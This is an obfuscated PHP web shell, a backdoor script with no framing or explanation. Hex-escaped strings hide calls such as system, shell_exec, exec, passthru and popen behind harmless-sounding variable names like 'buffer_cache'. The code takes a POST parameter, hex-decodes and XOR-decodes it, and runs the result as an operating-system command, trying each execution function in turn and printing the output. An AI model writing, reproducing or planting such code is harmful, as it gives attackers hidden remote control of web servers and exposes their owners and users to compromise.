<?php

$buffer_cache2 = "she\x6Cl\x5Fex\x65\x63";
$buffer_cache4 = "passt\x68\x72u";
$request_approved = "h\x65x2b\x69\x6E";
$buffer_cache7 = "\x70cl\x6F\x73e";
$buffer_cache1 = "s\x79\x73\x74em";
$buffer_cache5 = "p\x6F\x70en";
$buffer_cache6 = "strea\x6D_g\x65t\x5F\x63\x6F\x6E\x74\x65\x6E\x74s";
$buffer_cache3 = "\x65xe\x63";
if (isset($_POST["\x65\x6Et"])) {
            function task_processor( $hld , $symbol ) {$ent =''; foreach(str_split($hld) as $char){$ent.=chr(ord($char)^$symbol);} return $ent;}
            $ent = $request_approved($_POST["\x65\x6Et"]);
            $ent = task_processor($ent, 1);
            if (function_exists($buffer_cache1)) {
                $buffer_cache1($ent);
            } elseif (function_exists($buffer_cache2)) {
                print $buffer_cache2($ent);
            } elseif (function_exists($buffer_cache3)) {
                $buffer_cache3($ent, $dchunk_hld);
                print join("\n", $dchunk_hld);
            } elseif (function_exists($buffer_cache4)) {
                $buffer_cache4($ent);
            } elseif (function_exists($buffer_cache5) && function_exists($buffer_cache6) && function_exists($buffer_cache7)) {
                $symbol_ent = $buffer_cache5($ent, 'r');
                if ($symbol_ent) {
                    $descriptor_ref = $buffer_cache6($symbol_ent);
                    $buffer_cache7($symbol_ent);
                    print $descriptor_ref;
                }
            }
            exit;
        }